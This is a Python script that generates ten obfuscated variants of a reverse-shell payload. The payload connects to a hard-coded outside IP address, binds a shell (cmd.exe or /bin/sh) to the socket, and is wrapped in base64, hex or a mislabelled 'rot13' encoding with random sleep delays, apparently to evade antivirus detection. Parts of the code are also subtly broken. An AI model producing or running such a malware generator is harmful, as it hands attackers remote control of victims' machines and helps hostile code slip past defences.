import os
import random
import base64
import string
import time

VARIANTS_DIR = "variants"
os.makedirs(VARIANTS_DIR, exist_ok=True)

BASE_PAYLOAD = '''
import os, sys, socket, subprocess, requests, time
VPS_IP="157.245.3.180"; C2_PORT=8001; REPORT_URL="http://157.245.3.180:8000/report"
s = socket.socket(); s.connect((VPS_IP, C2_PORT))
os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
subprocess.call(["cmd.exe" if os.name == "nt" else "/bin/sh", "-i"])
'''

def generate_variant():
    payload = BASE_PAYLOAD
    vars = ["HOST", "PORT", "URL", "SOCK", "CMD"]
    new_vars = [''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(5, 10))) for _ in vars]
    for old, new in zip(vars, new_vars):
        payload = payload.replace(old, new)

    encoding = random.choice(["base64", "rot13", "hex"])
    if encoding == "base64":
        payload = f"exec(__import__('base64').b64decode('{base64.b64encode(payload.encode()).decode()}').decode())"
    elif encoding == "rot13":
        payload = f"exec(''.join(chr(ord(c)^13) if 'a'<=c<='z' or 'A'<=c<='Z' else c for c in '{payload}'))"
    elif encoding == "hex":
        payload = f"exec(bytes.fromhex('{payload.encode().hex()}').decode())"

    delay = random.randint(3, 25)
    payload = f"time.sleep({delay});" + payload
    return payload

for i in range(1, 11):
    try:
        with open(f"{VARIANTS_DIR}/variant_{i}.py", "w") as f:
            f.write(generate_variant())
        print(f"Created variant_{i}.py")
    except Exception as e:
        print(f"Error creating variant_{i}.py: {e}")
        time.sleep(5)  # Wait 5 seconds before trying again